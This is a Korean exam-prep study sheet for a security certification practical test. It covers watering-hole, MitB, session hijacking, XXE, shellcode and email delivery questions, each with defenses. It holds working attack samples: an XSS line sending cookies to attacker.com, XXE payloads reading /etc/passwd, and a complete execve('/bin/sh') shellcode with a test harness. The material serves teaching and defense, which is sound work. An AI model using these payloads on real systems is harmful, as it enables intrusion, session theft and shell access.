# 공격 기법 - 실기 필수 암기

## 🔴 워터링 홀 (Watering Hole) 공격 ★★★

### 문제 (2024년 기출)
```
워터링 홀에 대한 설명으로 올바른 것은?
```

### ✅ 정답
```
워터링 홀 (Watering Hole) 공격

정의:
특정 표적이 자주 방문하는 웹사이트를 감염시켜,
해당 사이트를 방문한 사용자를 공격하는 APT 공격 기법

유래:
사자가 물웅덩이(Watering Hole) 근처에서 먹이감을 기다리듯,
공격자가 표적이 자주 가는 사이트에서 기다림

공격 단계:
1. 표적 선정 및 정보 수집
   - 표적 기업 직원들이 자주 방문하는 사이트 파악
   - 업계 뉴스 사이트, 커뮤니티 등

2. 웹사이트 감염
   - 해당 사이트에 악성 코드 삽입
   - SQL Injection, XSS, 취약점 이용

3. 대기 (Watering Hole)
   - 표적이 사이트 방문하기를 기다림

4. 감염 및 공격
   - 표적 방문 시 Drive-by Download
   - 악성코드 자동 설치
   - 좀비 PC로 만들어 추가 공격

예시:
- 2013년 미국 국방업체 공격
- 2017년 금융권 대상 공격
```

### 방어 방법
```
조직 차원:
1. 웹 필터링
   - 업무와 무관한 사이트 차단
   - 화이트리스트 방식 운영

2. 샌드박스
   - 의심스러운 코드 격리 실행

3. 보안 교육
   - 직원 보안 인식 제고

개인 차원:
1. 브라우저 업데이트
2. 플러그인 최소화 (Flash, Java 제거)
3. NoScript 확장 프로그램 사용
```

## 🔴 MitB (Man-in-the-Browser) 공격 ★★★

### 문제 (2024년 기출)
```
MitB 취약점의 의미는?
```

### ✅ 정답
```
MitB (Man-in-the-Browser)
= 브라우저 중간자 공격

정의:
사용자의 웹 브라우저 내부에 악성코드를 삽입하여,
브라우저와 서버 간 통신을 조작하는 공격

특징:
- HTTPS 암호화도 우회 가능!
- 사용자 눈에 보이는 화면과 실제 전송 데이터가 다름
```

### MitB vs MITM 비교
```
┌──────────┬────────────────┬────────────────┐
│   구분   │     MITM       │     MitB       │
├──────────┼────────────────┼────────────────┤
│ 공격위치 │ 네트워크 경로  │ 브라우저 내부  │
├──────────┼────────────────┼────────────────┤
│ HTTPS    │ 인증서 경고    │ 탐지 어려움 ★ │
│ 우회     │ (탐지 가능)    │ (암호화 후 조작)│
├──────────┼────────────────┼────────────────┤
│ 공격방법 │ 프록시, ARP    │ 브라우저 확장   │
│          │ 스푸핑 등      │ 프로그램, DLL   │
│          │                │ 인젝션          │
└──────────┴────────────────┴────────────────┘
```

### 공격 시나리오 (온라인 뱅킹)
```
[정상 흐름]
사용자 → [브라우저] → [은행 서버]
입금: 홍길동, 100만원 → 홍길동 계좌에 100만원 입금

[MitB 공격]
사용자 → [브라우저 + 악성코드] → [은행 서버]
화면표시: 홍길동, 100만원 (사용자가 봄)
실제전송: 공격자, 100만원 (악성코드가 변조)

결과: 사용자는 정상 입금한 줄 알지만, 공격자 계좌로 송금됨!
```

### 방어 방법
```
1. 백신 및 안티멀웨어
   - 악성 브라우저 확장 프로그램 탐지

2. OTP (One-Time Password)
   - 거래 내용을 OTP 장치에 표시
   - 실제 송금 내용 확인 가능

3. 거래 확인
   - 이메일/SMS로 거래 내용 재확인

4. 가상 키보드
   - 키로거 방어 (MitB는 방어 못함)
```

## 🔴 세션 하이재킹 공격 순서 ★★★

### 문제 (2024년 기출)
```
세션 하이재킹 공격 순서는?
```

### ✅ 정답
```
[1단계: 세션 모니터링]
   공격자가 네트워크를 스니핑하여
   피해자와 서버 간 세션 패킷 캡처
   도구: Wireshark, tcpdump

[2단계: 세션 ID 획득]
   세션 쿠키 또는 토큰 값 추출
   예: JSESSIONID=ABC123XYZ

[3단계: 세션 예측 또는 탈취]
   방법 1: 세션 ID 추측 (Prediction)
   - 패턴 분석하여 다음 세션 ID 예측

   방법 2: 세션 고정 (Session Fixation)
   - 공격자가 특정 세션 ID를 피해자에게 강제 설정

   방법 3: XSS를 통한 쿠키 탈취
   - <script>document.location='http://attacker.com?c='+document.cookie</script>

[4단계: 세션 하이재킹]
   공격자가 탈취한 세션 ID를 자신의 브라우저에 설정
   서버는 정상 사용자로 인식
   인증 우회!

[5단계: 악의적 행위]
   - 권한 있는 작업 수행
   - 정보 유출
   - 설정 변경
```

### 공격 흐름도
```
[정상 로그인]
사용자 → 서버: 로그인 (ID/PW)
서버 → 사용자: 세션 쿠키 (SESSIONID=ABC123)
사용자 → 서버: 요청 (SESSIONID=ABC123 포함)
서버: 인증 OK, 요청 처리

[공격자 개입]
   │
   ├─ 공격자가 스니핑
   │  네트워크 패킷 캡처
   │  SESSIONID=ABC123 획득
   │
   ▼
공격자 → 서버: 요청 (SESSIONID=ABC123 포함)
서버: 정상 사용자로 착각, 요청 처리!
```

### 방어 방법
```
1. HTTPS 사용
   - 세션 쿠키 암호화 전송
   - 스니핑 어려움

2. Secure, HttpOnly 쿠키 플래그
   Set-Cookie: SESSIONID=ABC123; Secure; HttpOnly; SameSite=Strict
   - Secure: HTTPS에서만 전송
   - HttpOnly: JavaScript 접근 차단 (XSS 방어)
   - SameSite: CSRF 방어

3. 세션 ID 재발급
   - 로그인 성공 후 새 세션 ID 발급
   - 권한 변경 시마다 재발급

4. 세션 타임아웃
   - 일정 시간 미사용 시 세션 만료

5. IP 주소 바인딩
   - 세션 ID와 IP 주소 연결
   - IP 변경 시 세션 무효화
```

## 🔴 XXE (XML External Entity) 취약점 ★★

### 문제 (2024년 기출)
```
XXE 취약점에 대한 설명으로 올바른 것은?
```

### ✅ 정답
```
XXE (XML External Entity) Injection

정의:
XML 파서가 외부 엔티티를 처리할 때 발생하는 취약점
공격자가 악의적인 외부 엔티티를 삽입하여 시스템 파일 읽기,
SSRF 공격, DoS 등을 수행

공격 원리:
XML DTD (Document Type Definition)의 외부 엔티티 참조 기능 악용
```

### 공격 예시
```
[정상 XML]
<?xml version="1.0"?>
<user>
  <name>홍길동</name>
  <email>hong@example.com</email>
</user>

[XXE 공격 XML]
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
  <email>attacker@evil.com</email>
</user>

결과:
&xxe; 엔티티가 /etc/passwd 파일 내용으로 치환됨
→ 서버 응답에 /etc/passwd 내용 노출!
```

### 공격 유형
```
1. 로컬 파일 읽기 (Local File Disclosure)
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
   → /etc/passwd 내용 유출

2. SSRF (Server-Side Request Forgery)
   <!ENTITY xxe SYSTEM "http://internal-server/admin">
   → 내부 서버 접근

3. DoS (Billion Laughs Attack)
   <!ENTITY lol "lol">
   <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
   <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
   ...
   → 무한 확장으로 메모리 고갈
```

### 방어 방법
```
1. 외부 엔티티 비활성화 ★★★

Java (SAXParser):
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

PHP (libxml):
libxml_disable_entity_loader(true);

2. 안전한 파서 사용
   - JSON 사용 고려 (XML 대신)

3. 입력값 검증
   - DTD 사용 금지
   - <!DOCTYPE 태그 필터링

4. 최소 권한 원칙
   - XML 파서 실행 계정 권한 최소화
```

## 🔴 Shellcode 작성 순서 ★★

### 문제 (2024년 기출)
```
Shellcode 작성 순서?
```

### ✅ 정답
```
[1단계: 목표 정의]
   - 수행할 작업 결정 (예: /bin/sh 실행, 백도어 등)

[2단계: 어셈블리 코드 작성]
   - 시스템 콜 사용
   - 예: execve("/bin/sh", NULL, NULL)

   Assembly 예시:
   xor eax, eax    ; eax = 0
   push eax        ; NULL 종료 문자
   push 0x68732f2f ; "//sh" (역순)
   push 0x6e69622f ; "/bin" (역순)
   mov ebx, esp    ; ebx = "/bin//sh"
   mov ecx, eax    ; ecx = NULL
   mov edx, eax    ; edx = NULL
   mov al, 0x0b    ; execve 시스템 콜 번호
   int 0x80        ; 시스템 콜 호출

[3단계: 어셈블리 컴파일]
   nasm -f elf shellcode.asm
   ld -m elf_i386 -o shellcode shellcode.o

[4단계: 기계어 추출]
   objdump -d shellcode
   또는
   for i in $(objdump -d shellcode | grep "^ " | cut -f2); do echo -n '\x'$i; done

   결과:
   \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80

[5단계: Null Byte 제거]
   - Shellcode에 \x00 (NULL) 있으면 strcpy 등에서 끊김
   - xor eax, eax 대신 xor eax, eax; inc eax; dec eax 등 우회

[6단계: 테스트]
   C 프로그램에 삽입하여 실행 테스트

   char shellcode[] =
       "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
       "\x68\x2f\x62\x69\x6e\x89\xe3\x89"
       "\xc1\x89\xc2\xb0\x0b\xcd\x80";

   int (*ret)() = (int(*)())shellcode;
   ret();

[7단계: 익스플로잇에 통합]
   - 버퍼 오버플로우 취약점 등에 삽입
```

## 🔴 이메일 발송 순서 ★★

### 문제 (2024년 기출)
```
이메일 발송 순서는?
```

### ✅ 정답
```
[1단계: 이메일 작성]
   사용자가 이메일 클라이언트(Outlook, Gmail)에서 작성

[2단계: SMTP 서버로 전송]
   사용자 PC → 발신자 SMTP 서버
   프로토콜: SMTP (포트 25, 587)
   인증 후 이메일 제출

[3단계: DNS MX 레코드 조회]
   발신자 SMTP 서버가 수신자 도메인의 MX 레코드 조회
   예: nslookup -type=MX example.com
   결과: mail.example.com (우선순위 10)

[4단계: 수신자 SMTP 서버로 전송]
   발신자 SMTP 서버 → 수신자 SMTP 서버
   프로토콜: SMTP (포트 25)
   메일 릴레이

[5단계: 수신자 메일함 저장]
   수신자 SMTP 서버가 이메일을 메일함에 저장

[6단계: 이메일 수신]
   수신자가 이메일 클라이언트로 확인
   프로토콜:
   - POP3 (포트 110): 다운로드 후 서버에서 삭제
   - IMAP (포트 143): 서버에 보관, 동기화
```

### 그림으로 이해
```
[발신자] alice@company.com
    │
    │ [1] 이메일 작성
    ▼
[이메일 클라이언트]
    │
    │ [2] SMTP (587) - 인증
    ▼
[company.com SMTP 서버]
    │
    │ [3] DNS MX 조회
    │     example.com의 메일 서버는?
    │     → mail.example.com
    │
    │ [4] SMTP (25) - 릴레이
    ▼
[example.com SMTP 서버]
    │
    │ [5] 메일함 저장
    ▼
[Bob의 메일함]
    │
    │ [6] POP3/IMAP으로 수신
    ▼
[수신자] bob@example.com
```
